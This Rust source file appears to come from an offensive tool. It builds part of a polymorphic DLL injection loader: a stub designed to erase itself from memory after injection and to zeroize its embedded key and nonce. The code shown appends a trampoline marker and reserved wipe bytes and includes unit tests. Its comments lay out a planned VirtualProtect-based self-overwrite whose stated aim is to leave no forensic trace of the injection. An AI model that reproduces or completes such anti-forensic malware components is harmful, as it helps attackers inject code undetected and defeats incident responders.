//! Sub-issue #737 — self-erasing injection stub.
//!
//! After the DLL entry point returns, the loader overwrites itself with junk
//! bytes so a forensic memory dump finds no recoverable trace of the
//! injection method. Also zeroizes the embedded key + nonce.
//!
//! ## Today (foundation)
//! Appends a trampoline marker + zeroize sentinel to the stub. The runtime
//! wipe routine — a tight loop that overwrites its own page via
//! `VirtualProtect` + memset — is the body of #737.
//!
//! ## Planned (#737)
//! - Locate stub base + length at runtime via RIP-relative trick
//! - Re-protect page RW, overwrite with cryptographically random bytes
//! - Re-protect RX (or free), then jump into loaded DLL's thread

use super::PolymorphicError;

/// Marker bytes appended to identify where the trampoline begins. Real
/// shellcode replaces this in #737; tests use the marker to verify wiring.
pub const TRAMPOLINE_MARKER: &[u8] = b"\xCC\xCC\xDE\xAD\xBE\xEF\xCC\xCC";

/// Append the self-erase trampoline to the loader stub.
///
/// The trampoline runs after `DllMain` returns and:
/// 1. recovers its own base + length
/// 2. zeroizes the key + nonce immediates
/// 3. overwrites the entire stub region with random bytes
/// 4. transfers control to a benign return-to-caller
pub fn wire_trampoline(stub: &[u8]) -> Result<Vec<u8>, PolymorphicError> {
    if stub.is_empty() {
        return Err(PolymorphicError::SelfErase("stub is empty".into()));
    }
    let mut out = Vec::with_capacity(stub.len() + TRAMPOLINE_MARKER.len() + 16);
    out.extend_from_slice(stub);
    out.extend_from_slice(TRAMPOLINE_MARKER);
    // Reserve 8 bytes for the runtime wipe-length immediate, patched at
    // injection time by #737's emitter.
    out.extend_from_slice(&[0u8; 8]);
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wires_marker() {
        let stub = vec![0x90u8; 32];
        let out = wire_trampoline(&stub).unwrap();
        assert!(
            out.windows(TRAMPOLINE_MARKER.len())
                .any(|w| w == TRAMPOLINE_MARKER)
        );
        assert!(out.len() > stub.len());
    }

    #[test]
    fn empty_stub_rejected() {
        assert!(wire_trampoline(&[]).is_err());
    }
}
